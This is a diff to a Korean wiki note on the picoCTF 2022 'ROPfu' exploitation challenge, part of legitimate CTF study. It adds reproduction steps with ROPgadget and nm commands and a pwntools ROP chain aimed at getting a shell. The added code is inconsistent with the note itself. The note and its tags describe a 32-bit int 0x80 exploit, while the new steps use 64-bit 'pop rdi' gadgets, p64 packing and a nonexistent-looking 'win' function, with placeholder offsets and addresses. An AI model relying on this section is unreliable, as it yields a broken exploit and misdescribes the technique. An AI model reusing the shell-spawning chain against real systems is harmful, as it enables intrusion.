@@ -1,7 +1,7 @@
 ---
 title: ROPfu — picoCTF 2022 pwn writeup
 created: 2026-06-15
-updated: 2026-06-15
+updated: 2026-06-16
 type: query
 tags: [ctf, pwn, rop, nx, execve, int-0x80, picoctf]
 sources: [https://picoctf2022.haydenhousen.com/binary-exploitation/ropfu, https://cryptocat.me/blog/ctf/2022/pico/pwn/ropfu/]
@@ -93,6 +93,25 @@ io.interactive()                 # 쉘 획득 후 상호작용합니다.
 - `.data`는 writable이므로 `/bin/sh` 문자열을 두기에 적합합니다.
 - 32-bit syscall 인터페이스는 `int 0x80`로 간단하게 호출할 수 있습니다.
 
+
+## 재현 절차
+
+1. ROP에 사용할 가젯과 심볼을 찾습니다.
+```bash
+# 사용할 gadget과 심볼을 먼저 찾습니다.
+ROPgadget --binary ./vuln | grep "pop rdi"  # 예상: pop rdi; ret 같은 가젯이 출력됩니다.
+nm -n ./vuln | grep win                      # 예상: win 함수 주소가 출력됩니다.
+```
+2. execve로 이어지는 ROP chain을 구성합니다.
+```python
+# pwntools로 ROP chain을 구성하는 흐름입니다.
+from pwn import *
+rop = b"A" * 72           # 예시 오프셋입니다.
+rop += p64(0x40123b)      # 예시: pop rdi; ret 가젯입니다.
+rop += p64(0x404050)      # 예시: "/bin/sh" 또는 문자열 주소입니다.
+print(rop)
+```
+3. 체인을 실행해 flag 또는 쉘 획득 여부를 확인합니다.
 ## 7. 방어 관점 메모
 
 - NX만으로는 부족하고, ASLR/PIE/Canary/CFI가 함께 필요합니다.
